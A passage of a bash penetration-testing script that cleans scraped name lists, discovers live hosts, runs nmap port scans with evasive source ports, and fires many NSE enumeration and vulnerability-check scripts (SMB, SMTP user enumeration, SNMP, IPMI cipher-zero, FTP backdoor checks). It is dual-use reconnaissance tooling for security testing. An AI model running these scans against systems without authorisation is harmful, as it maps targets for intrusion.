s/-infrastructure/, Infrastructure/i; s/-instrumentation/, Instrumentation/i; s/-internal/, Internal/i; s/ ip / IP /i; s/ ir / IR /i; 
s/itenterpriseprojectmanager/IT Enterprise Project Manager/i; s/-IT/, IT/i; s/ iv / IV /i; s/ jc / JC /i; s/ jd / JD /i; s/ jt / JT /i; 
s/konsult, konsultchef, projektledare/Consultant/i; s/laboratorynetwork/Laboratory, Network/i; s/-labor/, Labor/i; 
s/lan administrator/LAN Administrator/i; s/lan admin/LAN Admin/i; s/-land/, Land/i; s/-licensing/, Licensing/i; s/LawIII60/Law360/g; s/ llc / LLC. /i; 
s/-logistics/, Logistics/i; s/lvl/Level/i; s/-mail/, Mail/i; s/-manager/, Manager/i; s/-marketing/, Marketing/i; s/-materials/, Materials/i; 
s/ mba / MBA /i; s/mca/McA/i; s/mcb/McB/i; s/mcc/McC/i; s/mcd/McD/i; s/mce/McE/i; s/mcf/McF/i; s/mcg/McG/i; s/mch/McH/i; s/mci/McI/i; s/mcj/McJ/i; 
s/mck/McK/i; s/mcl/McL/i; s/mcm/McM/i; s/mcn/McN/i; s/mcq/McQ/i; s/mcv/McV/i; s/mcse/MCSE/i; s/-mechanical/, Mechanical/i; s/-metals/, Metals/i; 
s/-metro/, Metro/i; s/, mp//i; s/ nerc / NERC /i; s/mcp/McP/i; s/mcr/McR/i; s/mcs/McS/i; s/mct/McT/i; s/mcw/McW/i; s/-media/, Media/i; 
s/-mergers/, Mergers/i; s/-millstone/, Millstone/i; s/-motor/, Motor/i; s/ mssp / MSSP /i; s/-networking/, Networking/i; s/-network/, Network/i; 
s/-new/, New/i; s/-north/, North/i; s/not in it//i; s/ nso / NSO /i; s/-nuclear/, Nuclear/i; s/ Nz / NZ /g; s/ oem / OEM /i; s/-office/, Office/i; 
s/ Of / of /g; s/-operations/, Operations/i; s/-oracle/, Oracle/i; s/-other/, Other/i; s/ pca / PCA /i; s/ pcs / PCS /i; s/ pc / PC /i; s/ pdm / PDM /i; 
s/ phd / PhD /i; s/ pj / PJ /i; s/-plant/, Plant/i; s/plt/Plant/i; s/pmo/PMO/i; s/ pmp/ PMP/i; s/ pm / PM /i; s/-power/, Power/i; 
s/-property/, Property/i; s/-public/, Public/i; s/pyble/Payble/i; s/ os / OS /i; s/r&d/R&D/i; s/ r and d /R&D/i; s/-records/, Records/i; 
s/-regulated/, Regulated/i; s/-regulatory/, Regulatory/i; s/-related/, Related/i; s/-remittance/, Remittance/i; s/-renewals/, Renewals/i; 
s/-revenue/, Revenue/i; s/ rfid / RFID /i; s/ rfp / RFP /i; s/ rf / RF /i; s/saas/SaaS/i; s/-safety/, Safety/i; s/san manager/SAN Manager/i; 
s/scada/SCADA/i; s/sdlc/SDLC/i; s/setac-/SETAC,/i; s/sftwr/Software/i; s/-short/, Short/i; s/ smb / SMB /i; s/sms/SMS/i; s/smtp/SMTP/i; s/snr/Senior/i; 
s/.specialist./ Specialist /i; s/sql/SQL/i; s/spvr/Supervisor/i; s/srbranch/Senior Branch/i; s/srsales/Senior Sales/i; s/ ssl / SSL /i; 
s/-staff/, Staff/i; s/stf/Staff/i; s/-station/, Station/i; s/-strategic/, Strategic/i; s/-student/, Student/i; s/-substation/, Substation/i; 
s/-supplier/, Supplier/i; s/-supply/, Supply/i; s/-surveillance/, Surveillance/i; s/swepco/SWEPCO/i; s/-system/, System/i; s/-tax/, Tax/i; 
s/-technical/, Technical/i; s/-telecommunications/, Telecommunications/i; s/ The / the /g; s/-three/, Three/i; s/-tickets/, Tickets/i; 
s/-trading/, Trading/i; s/-transmission/, Transmission/i; s/ttechnical/Technical/i; s/-turbine/, Turbine/i; s/ to .*$//i; s/ ui / UI /i; s/ uk / UK /i; 
s/unsupervisor/Supervisor/i; s/uscg/USCG/i; s/ usa / USA /i; s/ us / US /i; s/ u.s / US /i; s/usmc/USMC/i; s/-utility/, Utility/i; s/ ux / UX /i; 
s/vicepresident/Vice President/i; s/ vii / VII /i; s/ vi / VI /i; s/ vms / VMS /i; s/ voip / VoIP /i; s/ vpn / VPN /i; s/ With / with /g' > tmp5

# Remove lines that contain 2 words and clean up.
awk 'NF != 2' tmp5 | sed "s/d'a/D'A/i; s/d'c/D'C/i; s/d'e/D'E/i; s/d'h/D'H/i; s/d's/D'S/i; s/l'a/L'A/i; s/o'b/O'B/i; s/o'c/O'C/i; s/o'd/O'D/i; 
s/o'f/O'F/i; s/o'g/O'G/i; s/o'h/O'H/i; s/o'k/O'K/i; s/o'l/O'L/i; s/o'm/O'M/i; s/o'N/O'N/i; s/Obrien/O'Brien/i; s/Oconnor/O'Connor/i; 
s/Odonnell/O'Donnell/i; s/Ohara/O'Hara/i; s/o'p/O'P/i; s/o'r/O'R/i; s/o's/O'S/i; s/Otoole/O'Toole/i; s/o't/O'T/i" > tmp6

# Replace parenthesis and the contents inside with spaces - thanks Mike G
cat tmp6 | perl -pe 's/(\(.*\))/q[ ] x length $1/ge' > tmp7

# Remove trailing white space, railing commas, and delete lines with a single word
cat tmp7 | sed 's/[ \t]*$//; s/,$//; /[[:blank:]]/!d' | sort -u > $home/data/names.txt
rm tmp*

echo
echo $medium
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/names.txt
echo
echo
exit
}

##############################################################################################################

f_generateTargetList(){
clear
f_banner

echo -e "\x1B[1;34mSCANNING\x1B[0m"
echo
echo "1.  Local area network"
echo "2.  NetBIOS"
echo "3.  netdiscover"
echo "4.  Ping sweep"
echo "5.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) f_errorOSX

     echo
     echo -n "Interface to scan: "
     read interface

     # Check for no answer
     if [[ -z $interface ]]; then
          f_error
     fi

     arp-scan -l -I $interface | egrep -v '(arp-scan|Interface|packets|Polycom|Unknown)' | awk '{print $1}' | $sip | sed '/^$/d' > $home/data/hosts-arp.txt

     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/hosts-arp.txt
     echo
     echo
     exit;;
     2) f_errorOSX; f_netbios;;
     3) f_errorOSX; f_netdiscover;;
     4) f_pingsweep;;
     5) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_netbios(){
clear
f_banner

echo -e "\x1B[1;34mType of input:\x1B[0m"
echo
echo "1.  List containing IPs."
echo "2.  CIDR"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     f_location

     echo
     echo $medium
     echo
     nbtscan -f $location
     echo
     echo
     exit;;

     2)
     echo
     echo -n "Enter your CIDR: "
     read cidr

     # Check for no answer
     if [[ -z $cidr ]]; then
          f_error
     fi

     echo
     echo $medium
     echo
     nbtscan -r $cidr
     echo
     echo
     exit;;

     *) f_error;;
esac
}

##############################################################################################################

f_netdiscover(){

range=$(ip addr | grep 'global' | cut -d '/' -f1 | awk '{print $2}' | cut -d '.' -f1-3)'.1'

netdiscover -r $range -f -P | grep ':' | awk '{print $1}' > $home/data/netdiscover.txt

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/netdiscover.txt
echo
echo
exit
}

##############################################################################################################

f_pingsweep(){
clear
f_banner
f_typeofscan

echo -e "\x1B[1;34mType of input:\x1B[0m"
echo
echo "1.  List containing IPs, ranges and/or CIDRs."
echo "2.  Manual"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     f_location

     echo
     echo "Running an Nmap ping sweep for live hosts."
     nmap -sn -PS -PE --stats-every 10s -g $sourceport -iL $location > tmp
     ;;

     2)
     echo
     echo -n "Enter your targets: "
     read manual

     # Check for no answer
     if [[ -z $manual ]]; then
          f_error
     fi

     echo
     echo "Running an Nmap ping sweep for live hosts."
     nmap -sn -PS -PE --stats-every 10s -g $sourceport $manual > tmp
     ;;

     *) f_error;;
esac

cat tmp | grep 'report' | awk '{print $5}' > tmp2
mv tmp2 $home/data/hosts-ping.txt
rm tmp

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/hosts-ping.txt
echo
echo
exit
}

##############################################################################################################

f_scanname(){
f_typeofscan

echo -e "\x1B[1;33m[*] Warning spaces in the name will cause errors\x1B[0m"
echo
echo -n "Name of scan: "
read name

# Check for no answer
if [[ -z $name ]]; then
     f_error
fi

mkdir -p $name
}

##############################################################################################################

f_typeofscan(){
echo -e "\x1B[1;34mType of scan: \x1B[0m"
echo
echo "1.  External"
echo "2.  Internal"
echo "3.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     echo
     echo -e "\x1B[1;33m[*] Setting source port to 53 and max probe round trip to 1.5s.\x1B[0m"
     sourceport=53
     maxrtt=1500ms
     echo
     echo $medium
     echo
     ;;

     2)
     echo
     echo -e "\x1B[1;33m[*] Setting source port to 88 and max probe round trip to 500ms.\x1B[0m"
     sourceport=88
     maxrtt=500ms
     echo
     echo $medium
     echo
     ;;

     3) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_cidr(){
clear
f_banner
f_scanname

echo
echo Usage: 192.168.0.0/16
echo
echo -n "CIDR: "
read cidr

# Check for no answer
if [[ -z $cidr ]]; then
     rm -rf $name
     f_error
fi

# Check for wrong answer

sub=$(echo $cidr | cut -d '/' -f2)
max=32

if [ "$sub" -gt "$max" ]; then
     f_error
fi

echo $cidr | grep '/' > /dev/null 2>&1

if [ $? -ne 0 ]; then
     f_error
fi

echo $cidr | grep [[:alpha:]\|[,\\]] > /dev/null 2>&1

if [ $? -eq 0 ]; then
     f_error
fi

echo $cidr > tmp-list
location=tmp-list

echo
echo -n "Do you have an exclusion list? (y/N) "
read exclude

if [ "$exclude" == "y" ]; then
     echo -n "Enter the path to the file: "
     read excludefile

     if [[ -z $excludefile ]]; then
          f_error
     fi

     if [ ! -f $excludefile ]; then
          f_error
     fi
else
     touch tmp
     excludefile=tmp
fi

START=$(date +%r\ %Z)

f_scan
f_ports
f_scripts
f_metasploit
f_report
}

##############################################################################################################

f_list(){
clear
f_banner
f_scanname
f_location

touch tmp
excludefile=tmp

START=$(date +%r\ %Z)

f_scan
f_ports
f_scripts
f_metasploit
f_report
}

##############################################################################################################

f_single(){
clear
f_banner
f_scanname

echo
echo -n "IP, range, or URL: "
read target

# Check for no answer
if [[ -z $target ]]; then
     rm -rf $name
     f_error
fi

echo $target > tmp-target
location=tmp-target

touch tmp
excludefile=tmp

START=$(date +%r\ %Z)

f_scan
f_ports
f_scripts
f_metasploit
f_report
}

##############################################################################################################

f_scan(){
custom='1-1040,1050,1080,1099,1158,1344,1352,1433,1521,1720,1723,1883,1911,1962,2049,2202,2375,2628,2947,3000,3031,3050,3260,3306,3310,3389,3500,3632,4369,5000,5019,5040,5060,5432,5560,5631,5632,5666,5672,5850,5900,5920,5984,5985,6000,6001,6002,6003,6004,6005,6379,6666,7210,7634,7777,8000,8009,8080,8081,8091,8140,8222,8332,8333,8400,8443,8834,9000,9084,9100,9160,9600,9999,10000,11211,12000,12345,13364,19150,27017,28784,30718,35871,37777,46824,49152,50000,50030,50060,50070,50075,50090,60010,60030'
full='1-65535'
udp='53,67,123,137,161,407,500,523,623,1434,1604,1900,2302,2362,3478,3671,4800,5353,5683,6481,17185,31337,44818,47808'

echo
echo -n "Perform full TCP port scan? (y/N) "
read scan

if [ "$scan" == "y" ]; then
     tcp=$full
else
     tcp=$custom
fi

echo
echo -n "Perform version detection? (y/N) "
read vdetection

if [ "$vdetection" == "y" ]; then
     S='sSV'
     U='sUV'
else
     S='sS'
     U='sU'
fi

echo
echo -n "Set scan delay. (0-5, enter for normal) "
read delay

# Check for no answer
if [[ -z $delay ]]; then
     delay='0'
fi

if [ $delay -lt 0 ] || [ $delay -gt 5 ]; then
     f_error
fi

echo
echo $medium

nmap -iL $location --excludefile $excludefile --privileged -n -PE -PS21-23,25,53,80,110-111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 -PU53,67-69,123,135,137-139,161-162,445,500,514,520,631,1434,1900,4500,5353,49152 -$S -$U -O --osscan-guess --max-os-tries 1 -p T:$tcp,U:$udp --max-retries 3 --min-rtt-timeout 100ms --max-rtt-timeout $maxrtt --initial-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --open --stats-every 10s -g $sourceport --scan-delay $delay -oA $name/nmap

x=$(grep '(0 hosts up)' $name/nmap.nmap)

if [[ -n $x ]]; then
     rm -rf "$name" tmp
     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     echo -e "\x1B[1;33m[*] No live hosts were found.\x1B[0m"
     echo
     echo
     exit
fi

# Clean up
egrep -v '(0000:|0010:|0020:|0030:|0040:|0050:|0060:|0070:|0080:|0090:|00a0:|00b0:|00c0:|00d0:|1 hop|closed|guesses|GUESSING|filtered|fingerprint|FINGERPRINT|general purpose|initiated|latency|Network Distance|No exact OS|No OS matches|OS:|OS CPE|Please report|RTTVAR|scanned in|SF|unreachable|Warning|WARNING)' $name/nmap.nmap | sed 's/Nmap scan report for //' | sed '/^$/! b end; n; /^$/d; : end' > $name/nmap.txt

grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' $name/nmap.nmap | $sip > $name/hosts.txt
hosts=$(wc -l $name/hosts.txt | cut -d ' ' -f1)

grep 'open' $name/nmap.txt | grep -v 'WARNING' | awk '{print $1}' | sort -un > $name/ports.txt
grep 'tcp' $name/ports.txt | cut -d '/' -f1 > $name/ports-tcp.txt
grep 'udp' $name/ports.txt | cut -d '/' -f1 > $name/ports-udp.txt

grep 'open' $name/nmap.txt | grep -v 'really open' | awk '{for (i=4;i<=NF;i++) {printf "%s%s",sep, $i;sep=" "}; printf "\n"}' | sed 's/^ //' | sort -u | sed '/^$/d' > $name/banners.txt

for i in $(cat $name/ports-tcp.txt); do
     TCPPORT=$i
     cat $name/nmap.gnmap | grep " $i/open/tcp//http/\| $i/open/tcp//http-alt/\| $i/open/tcp//http-proxy/\| $i/open/tcp//appserv-http/" |
     sed -e 's/Host: //g' -e 's/ (.*//g' -e 's.^.http://.g' -e "s/$/:$i/g" | $sip >> tmp
     cat $name/nmap.gnmap | grep " $i/open/tcp//https/\| $i/open/tcp//https-alt/\| $i/open/tcp//ssl|giop/\| $i/open/tcp//ssl|http/\| $i/open/tcp//ssl|unknown/" |
     sed -e 's/Host: //g' -e 's/ (.*//g' -e 's.^.https://.g' -e "s/$/:$i/g" | $sip >> tmp2
done

sed 's/http:\/\///g' tmp > $name/http.txt
sed 's/https:\/\///g' tmp2 > $name/https.txt

# Remove all empty files
find $name/ -type f -empty -exec rm {} +
}

##############################################################################################################

f_ports(){
echo
echo $medium
echo
echo -e "\x1B[1;34mLocating high value ports.\x1B[0m"
echo "     TCP"
TCP_PORTS="13 19 21 22 23 25 37 69 70 79 80 102 110 111 119 135 139 143 389 433 443 445 465 502 512 513 514 523 524 548 554 563 587 623 631 636 771 831 873 902 993 995 998 1050 1080 1099 1158 1344 1352 1433 1521 1720 1723 1883 1911 1962 2049 2202 2375 2628 2947 3000 3031 3050 3260 3306 3310 3389 3500 3632 4369 5000 5019 5040 5060 5432 5560 5631 5632 5666 5672 5850 5900 5920 5984 5985 6000 6001 6002 6003 6004 6005 6379 6666 7210 7634 7777 8000 8009 8080 8081 8091 8140 8222 8332 8333 8400 8443 8834 9000 9084 9100 9160 9600 9999 10000 11211 12000 12345 13364 19150 27017 28784 30718 35871 37777 46824 49152 50000 50030 50060 50070 50075 50090 60010 60030"

for i in $TCP_PORTS; do
     cat $name/nmap.gnmap | grep "\<$i/open/tcp\>" | cut -d ' ' -f2 > $name/$i.txt
done

if [[ -e $name/523.txt ]]; then
     mv $name/523.txt $name/523-tcp.txt
fi

if [[ -e $name/5060.txt ]]; then
     mv $name/5060.txt $name/5060-tcp.txt
fi

echo "     UDP"
UDP_PORTS="53 67 123 137 161 407 500 523 623 1434 1604 1900 2302 2362 3478 3671 4800 5353 5683 6481 17185 31337 44818 47808"

for i in $UDP_PORTS; do
     cat $name/nmap.gnmap | grep "\<$i/open/udp\>" | cut -d ' ' -f2 > $name/$i.txt
done

if [[ -e $name/523.txt ]]; then
     mv $name/523.txt $name/523-udp.txt
fi

# Combine Apache HBase ports and sort
cat $name/60010.txt $name/60030.txt > tmp
$sip tmp > $name/apache-hbase.txt

# Combine Bitcoin ports and sort
cat $name/8332.txt $name/8333.txt > tmp
$sip tmp > $name/bitcoin.txt

# Combine DB2 ports and sort
cat $name/523-tcp.txt $name/523-udp.txt > tmp
$sip tmp > $name/db2.txt

# Combine Hadoop ports and sort
cat $name/50030.txt $name/50060.txt $name/50070.txt $name/50075.txt $name/50090.txt > tmp
$sip tmp > $name/hadoop.txt

# Combine NNTP ports and sort
cat $name/119.txt $name/433.txt $name/563.txt > tmp
$sip tmp > $name/nntp.txt

# Combine SMTP ports and sort
cat $name/25.txt $name/465.txt $name/587.txt > tmp
$sip tmp > $name/smtp.txt

# Combine X11 ports and sort
cat $name/6000.txt $name/6001.txt $name/6002.txt $name/6003.txt $name/6004.txt $name/6005.txt > tmp
$sip tmp > $name/x11.txt

# Remove all empty files
find $name/ -type f -empty -exec rm {} +
}

##############################################################################################################

f_cleanup(){
sed 's/Nmap scan report for //' tmp | sed '/^SF/d' | egrep -v '(0 of 100|afp-serverinfo:|ACCESS_DENIED|appears to be clean|cannot|closed|close|Compressors|Could not|Couldn|ctr-|Denied|denied|Did not|DISABLED|dns-nsid:|dns-service-discovery:|Document Moved|doesn|eppc-enum-processes|error|Error|ERROR|Failed to get|failed|filtered|GET|hbase-region-info:|HEAD|Host is up|Host script results|impervious|incorrect|is GREAT|latency|ldap-rootdse:|LDAP Results|Likely CLEAN|MAC Address|Mac OS X security type|nbstat:|No accounts left|No Allow|no banner|none|Nope.|not allowed|Not Found|Not Shown|not supported|NOT VULNERABLE|nrpe-enum:|ntp-info:|rdp-enum-encryption:|remaining|rpcinfo:|seconds|Security types|See http|Server not returning|Service Info|service unrecognized|Skipping|smb-check-vulns|smb-mbenum:|sorry|Starting|telnet-encryption:|Telnet server does not|TIMEOUT|Unauthorized|uncompressed|unhandled|Unknown|viewed over a secure|vnc-info:|wdb-version:)' | grep -v "Can't" | awk -v n=-2 'NR==n+1 && !NF{next} /^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/ {n=NR}1' | awk -v n=-2 'NR==n+1 && NF{print hold} /sslv2-drown:/ {n=NR;hold=$0;next}1' | awk -F '\n' 'BEGIN{RS="\n\n"}NF>3{print $0 "\n"}' > tmp4
}

##############################################################################################################

f_scripts(){
echo
echo $medium
echo
echo -e "\x1B[1;34mRunning Nmap scripts.\x1B[0m"

# If the file for the corresponding port doesn't exist, skip
if [[ -e $name/13.txt ]]; then
     echo "     Daytime"
     nmap -iL $name/13.txt -Pn -n --open -p13 --script-timeout 1m --script=daytime --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-13.txt
fi

if [[ -e $name/21.txt ]]; then
     echo "     FTP"
     nmap -iL $name/21.txt -Pn -n --open -p21 --script-timeout 1m --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ssl*,tls-nextprotoneg -sV --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-21.txt
fi

if [[ -e $name/22.txt ]]; then
     echo "     SSH"
     nmap -iL $name/22.txt -Pn -n --open -p22 --script-timeout 1m --script=sshv1,ssh2-enum-algos --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-22.txt
fi

if [[ -e $name/23.txt ]]; then
     echo "     Telnet"
     nmap -iL $name/23.txt -Pn -n --open -p23 --script-timeout 1m --script=banner,cics-info,cics-enum,cics-user-enum,telnet-encryption,telnet-ntlm-info,tn3270-screen,tso-enum --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-23.txt
fi

if [[ -e $name/smtp.txt ]]; then
     echo "     SMTP"
     nmap -iL $name/smtp.txt -Pn -n --open -p25,465,587 --script-timeout 1m --script=banner,smtp-commands,smtp-ntlm-info,smtp-open-relay,smtp-strangeport,smtp-enum-users,ssl*,tls-nextprotoneg -sV --script-args smtp-enum-users.methods={EXPN,RCPT,VRFY} --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-smtp.txt
fi

if [[ -e $name/37.txt ]]; then
     echo "     Time"
     nmap -iL $name/37.txt -Pn -n --open -p37 --script-timeout 1m --script=rfc868-time --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-37.txt
fi

if [[ -e $name/53.txt ]]; then
     echo "     DNS"
     nmap -iL $name/53.txt -Pn -n -sU --open -p53 --script-timeout 1m --script=dns-blacklist,dns-cache-snoop,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-update,dns-zeustracker,dns-zone-transfer --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-53.txt
fi

if [[ -e $name/67.txt ]]; then
     echo "     DHCP"
     nmap -iL $name/67.txt -Pn -n -sU --open -p67 --script-timeout 1m --script=dhcp-discover --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-67.txt
fi

if [[ -e $name/70.txt ]]; then
     echo "     Gopher"
     nmap -iL $name/70.txt -Pn -n --open -p70 --script-timeout 1m --script=gopher-ls --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-70.txt
fi

if [[ -e $name/79.txt ]]; then
     echo "     Finger"
     nmap -iL $name/79.txt -Pn -n --open -p79 --script-timeout 1m --script=finger --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-79.txt
fi

if [[ -e $name/102.txt ]]; then
     echo "     S7"
     nmap -iL $name/102.txt -Pn -n --open -p102 --script-timeout 1m --script=s7-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-102.txt
fi

if [[ -e $name/110.txt ]]; then
     echo "     POP3"
     nmap -iL $name/110.txt -Pn -n --open -p110 --script-timeout 1m --script=banner,pop3-capabilities,pop3-ntlm-info,ssl*,tls-nextprotoneg -sV --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-110.txt
fi

if [[ -e $name/111.txt ]]; then
     echo "     RPC"
     nmap -iL $name/111.txt -Pn -n --open -p111 --script-timeout 1m --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-111.txt
fi

if [[ -e $name/nntp.txt ]]; then
     echo "     NNTP"
     nmap -iL $name/nntp.txt -Pn -n --open -p119,433,563 --script-timeout 1m --script=nntp-ntlm-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-nntp.txt
fi

if [[ -e $name/123.txt ]]; then
     echo "     NTP"
     nmap -iL $name/123.txt -Pn -n -sU --open -p123 --script-timeout 1m --script=ntp-info,ntp-monlist --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-123.txt
fi

if [[ -e $name/137.txt ]]; then
     echo "     NetBIOS"
     nmap -iL $name/137.txt -Pn -n -sU --open -p137 --script-timeout 1m --script=nbstat --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     sed -i '/^MAC/{n; /.*/d}' tmp4		    # Find lines that start with MAC, and delete the following line
     sed -i '/^137\/udp/{n; /.*/d}' tmp4	# Find lines that start with 137/udp, and delete the following line
     mv tmp4 $name/script-137.txt
fi

if [[ -e $name/139.txt ]]; then
     echo "     SMB Vulns"
     nmap -iL $name/139.txt -Pn -n --open -p139 --script-timeout 1m --script=smb* --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     egrep -v '(SERVICE|netbios)' tmp4 > tmp5
     sed '1N;N;/\(.*\n\)\{2\}.*VULNERABLE/P;$d;D' tmp5
     sed '/^$/d' tmp5 > tmp6
     grep -v '|' tmp6 > $name/script-smbvulns.txt
fi

if [[ -e $name/143.txt ]]; then
     echo "     IMAP"
     nmap -iL $name/143.txt -Pn -n --open -p143 --script-timeout 1m --script=imap-capabilities,imap-ntlm-info,ssl*,tls-nextprotoneg -sV --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-143.txt
fi

if [[ -e $name/161.txt ]]; then
     echo "     SNMP"
     nmap -iL $name/161.txt -Pn -n -sU --open -p161 --script-timeout 1m --script=snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users -sV --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-161.txt
fi

if [[ -e $name/389.txt ]]; then
     echo "     LDAP"
     nmap -iL $name/389.txt -Pn -n --open -p389 --script-timeout 1m --script=ldap-rootdse,ssl*,tls-nextprotoneg -sV --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-389.txt
fi

if [[ -e $name/443.txt ]]; then
     echo "     VMware"
     nmap -iL $name/443.txt -Pn -n --open -p443 --script-timeout 1m --script=vmware-version --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-443.txt
fi

if [[ -e $name/445.txt ]]; then
     echo "     SMB"
     nmap -iL $name/445.txt -Pn -n --open -p445 --script-timeout 1m --script=msrpc-enum,smb*,stuxnet-detect --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     sed -i '/^445/{n; /.*/d}' tmp4		# Find lines that start with 445, and delete the following line
     mv tmp4 $name/script-445.txt
fi

if [[ -e $name/500.txt ]]; then
     echo "     Ike"
     nmap -iL $name/500.txt -Pn -n -sS -sU --open -p500 --script-timeout 1m --script=ike-version -sV --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-500.txt
fi

if [[ -e $name/db2.txt ]]; then
     echo "     DB2"
     nmap -iL $name/db2.txt -Pn -n -sS -sU --open -p523 --script-timeout 1m --script=db2-das-info,db2-discover --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-523.txt
fi

if [[ -e $name/524.txt ]]; then
     echo "     Novell NetWare Core Protocol"
     nmap -iL $name/524.txt -Pn -n --open -p524 --script-timeout 1m --script=ncp-enum-users,ncp-serverinfo --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-524.txt
fi

if [[ -e $name/548.txt ]]; then
     echo "     AFP"
     nmap -iL $name/548.txt -Pn -n --open -p548 --script-timeout 1m --script=afp-ls,afp-path-vuln,afp-serverinfo,afp-showmount --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-548.txt
fi

if [[ -e $name/554.txt ]]; then
     echo "     RTSP"
     nmap -iL $name/554.txt -Pn -n --open -p554 --script-timeout 1m --script=rtsp-methods --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-554.txt
fi

if [[ -e $name/623.txt ]]; then
     echo "     IPMI"
     nmap -iL $name/623.txt -Pn -n -sU --open -p623 --script-timeout 1m --script=ipmi-version,ipmi-cipher-zero --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-623.txt
fi

if [[ -e $name/631.txt ]]; then
     echo "     CUPS"
     nmap -iL $name/631.txt -Pn -n --open -p631 --script-timeout 1m --script=cups-info,cups-queue-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-631.txt
fi

if [[ -e $name/636.txt ]]; then
     echo "     LDAP/S"
     nmap -iL $name/636.txt -Pn -n --open -p636 --script-timeout 1m --script=ldap-rootdse,ssl*,tls-nextprotoneg -sV --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-636.txt
fi

if [[ -e $name/873.txt ]]; then
     echo "     rsync"
     nmap -iL $name/873.txt -Pn -n --open -p873 --script-timeout 1m --script=rsync-list-modules --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-873.txt
fi

if [[ -e $name/993.txt ]]; then
     echo "     IMAP/S"
     nmap -iL $name/993.txt -Pn -n --open -p993 --script-timeout 1m --script=banner,imap-capabilities,imap-ntlm-info,ssl*,tls-nextprotoneg -sV --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-993.txt
fi

if [[ -e $name/995.txt ]]; then
     echo "     POP3/S"
     nmap -iL $name/995.txt -Pn -n --open -p995 --script-timeout 1m --script=banner,pop3-capabilities,pop3-ntlm-info,ssl*,tls-nextprotoneg -sV --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-995.txt
fi

if [[ -e $name/1050.txt ]]; then
     echo "     COBRA"
     nmap -iL $name/1050.txt -Pn -n --open -p1050 --script-timeout 1m --script=giop-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
